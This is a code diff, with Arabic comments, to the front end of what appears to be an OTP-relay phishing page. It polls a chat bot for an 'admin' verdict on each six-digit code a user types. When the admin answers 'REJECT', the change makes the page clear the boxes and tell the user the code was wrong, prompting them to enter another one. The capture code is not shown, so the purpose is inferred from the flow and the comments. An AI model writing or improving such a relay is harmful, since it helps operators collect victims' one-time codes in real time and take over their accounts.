@@ -115,11 +115,11 @@ function startPolling() {
       lastUpdateId = u.update_id;
       const text = u.message?.text?.trim() || '';
 
-      /* REJECT → رفض */
+      /* REJECT → إظهار خطأ وإعادة المحاولة */
       if (text.toUpperCase() === 'REJECT') {
         waitingConfirm = false;
         clearInterval(pollInt);
-        showRejection();
+        resetForRetry('رمز التحقق غير صحيح — حاول مرة أخرى برمز آخر');
         return;
       }
 
@@ -134,6 +134,37 @@ function startPolling() {
       /* رمز مختلف → تجاهل (الإدمن لم يقرر بعد) */
     }
   }, 3000);
+}
+
+/* ─── إعادة المحاولة (عند REJECT أو رمز خاطئ) ──────── */
+function resetForRetry(errMsg) {
+  const boxes      = [...document.querySelectorAll('.otp-box')];
+  const confirmBtn = document.getElementById('otp-confirm-btn');
+  const sub        = document.getElementById('otp-sub-text');
+
+  /* مسح المربعات + إعادة تفعيلها */
+  boxes.forEach(b => {
+    b.value = '';
+    b.disabled = false;
+    b.classList.remove('filled','otp-success');
+    b.classList.add('otp-error');
+    setTimeout(() => b.classList.remove('otp-error'), 600);
+  });
+
+  /* إعادة زر التأكيد */
+  if (confirmBtn) {
+    confirmBtn.disabled = true;
+    confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد';
+  }
+
+  /* رسالة الخطأ */
+  setOTPErr(errMsg);
+
+  /* إعادة النص */
+  if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام لتأكيد العملية`;
+
+  /* تركيز أول مربع */
+  boxes[0]?.focus();
 }
 
 /* ─── عرض الرفض ───────────────────────────────────── */
